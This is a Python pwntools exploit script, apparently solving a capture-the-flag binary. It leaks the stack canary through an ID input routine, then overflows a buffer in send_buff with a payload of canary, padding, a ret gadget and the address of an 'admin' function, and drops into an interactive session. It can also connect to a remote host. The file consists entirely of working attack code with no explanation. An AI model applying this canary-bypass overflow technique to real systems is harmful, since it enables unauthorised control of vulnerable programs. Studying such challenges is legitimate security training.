#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *send_buff+191
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
buffer overflow:
    - send_buff


memory leak:
    - input_id
    - print_id
"""

def init():
    global io

    io = start()

def input_id():
    io.sendlineafter(b">", b"1")

    for i in range(3):
        io.sendlineafter(b":", b"1337")

    io.sendlineafter(b":", b"-")

    io.sendlineafter(b">", b"2")
    io.recvuntil(b"id: ")
    canary = int(io.recvline().split(b" ")[4])
    return canary


def send_buff(canary):
    offset = 1000
    ret = 0x040101a # ret;

    payload = flat({
        offset: [
            canary,
            cyclic(8),
            ret,
            exe.sym["admin"]
        ]
    })

    io.sendline(payload)

def solve():

    canary = input_id()
    send_buff(canary)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

